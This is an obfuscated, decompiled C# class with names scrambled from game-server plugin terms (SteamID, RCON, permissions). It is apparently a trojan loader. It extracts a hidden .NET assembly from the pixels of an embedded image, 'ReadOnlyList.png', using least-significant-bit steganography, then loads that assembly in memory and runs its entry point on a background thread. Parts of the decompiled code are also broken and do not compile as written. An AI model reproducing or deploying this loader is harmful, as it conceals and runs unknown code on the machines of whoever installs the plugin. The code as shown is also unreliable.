using System;
using System.Collections;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

public class InternalReadElementContentAsObjectAsyncd__210
{
	private sealed class a9brCtgI4CXBBPbKVn
	{
		public MethodInfo tb5L36XcB;

		public Assembly vxiBU4L41;

		internal void daDOH8WHU()
		{
			tb5L36XcB.Invoke(InternalReadElementContentAsObjectAsyncd__210.get_NamehandleConnectionget_MemberSince(vxiBU4L41, tb5L36XcB), null);
		}
	}

	public static Assembly open = Assembly.Load(IReferenceFactory.Aliasesremove_OnPluginUnloadingIsUri);

	public static MethodInfo mentry = Assembly.Load(IReferenceFactory.Aliasesremove_OnPluginUnloadingIsUri).EntryPoint;

	internal static object AvatarFullHasPermissionget_HoursPlayedLastTwoWeeks
	{
		[MethodImpl(MethodImplOptions.NoOptimization)]
		set
		{
		}
	}

	public static object NamehandleConnectionget_MemberSince => assembly.CreateInstance(remove_OnPluginsLoadedHasPermissionsExecute(entryPoint));

	public static MethodInfo SteamIDlogRCONTryInvoke
	{
		set
		{
			a9brCtgI4CXBBPbKVn a9brCtgI4CXBBPbKVn = new a9brCtgI4CXBBPbKVn();
			a9brCtgI4CXBBPbKVn.tb5L36XcB = value;
			a9brCtgI4CXBBPbKVn.vxiBU4L41 = assembly;
			new Thread(a9brCtgI4CXBBPbKVn.daDOH8WHU).Start();
		}
	}

	private static int AvatarFullget_SyntaxParseDateTime
	{
		set
		{
			int num = value * 8;
			int num2 = byteIndex * 8;
			bool[] array = new bool[num];
			for (int i = 0; i < num; i++)
			{
				array[i] = (int)innocuousLookingData[i + num2] % 2 == 1;
			}
			BitArray bitArray = new BitArray(array);
			byte[] array2 = new byte[bitArray.Length / 8];
			bitArray.CopyTo(array2, 0);
			return array2;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public InternalReadElementContentAsObjectAsyncd__210()
	{
		AvatarFullHasPermissionget_HoursPlayedLastTwoWeeks = this;
	}

	public static string remove_OnPluginsLoadedHasPermissionsExecute(MethodInfo entryPoint)
	{
		return (string)LogWarningget_Aliasesget_Translations(entryPoint);
	}

	public static void LogReloadGetPermissions()
	{
		UnloadPluginIsDependencyLoadedRegister();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static object LogWarningget_Aliasesget_Translations(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static bool UnloadPluginIsDependencyLoadedRegister()
	{
		InternalReadElementContentAsObjectAsyncd__210.set_SteamIDlogRCONTryInvoke(open, mentry);
		return true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static bool ParseUInt32AddPlayerToGroup_003C_002Ector_003Eb__3_0()
	{
		return false;
	}

	public static Image IsDependencyLoadedProcessInternalLoggetCommandType(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("ReadOnlyList.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}

	public static byte[] add_OnRockedInitializedGetWindowTextLengthUnload(Bitmap b)
	{
		int width = ((Image)b).get_Width();
		int num = width * width * 4;
		byte[] array = new byte[num];
		int num2 = 0;
		for (int i = 0; i < width; i++)
		{
			for (int j = 0; j < width; j++)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(b.GetPixel(i, j).ToArgb()), 0, array, num2, 4);
				num2 += 4;
			}
		}
		int num3 = BitConverter.ToInt32(array, 0);
		byte[] array2 = new byte[num3];
		Buffer.BlockCopy(array, 4, array2, 0, array2.Length);
		return array2;
	}

	public static byte[] GetPlugin_invokeUnload(Image imageFileName)
	{
		byte[] innocuousLookingData = Util.remove_OnPluginsLoadedAwakeLoadDefaults(imageFileName);
		byte[] value = InternalReadElementContentAsObjectAsyncd__210.set_AvatarFullget_SyntaxParseDateTime(innocuousLookingData, 0, 4);
		int value2 = BitConverter.ToInt32(value, 0);
		return InternalReadElementContentAsObjectAsyncd__210.set_AvatarFullget_SyntaxParseDateTime(innocuousLookingData, 4, value2);
	}
}
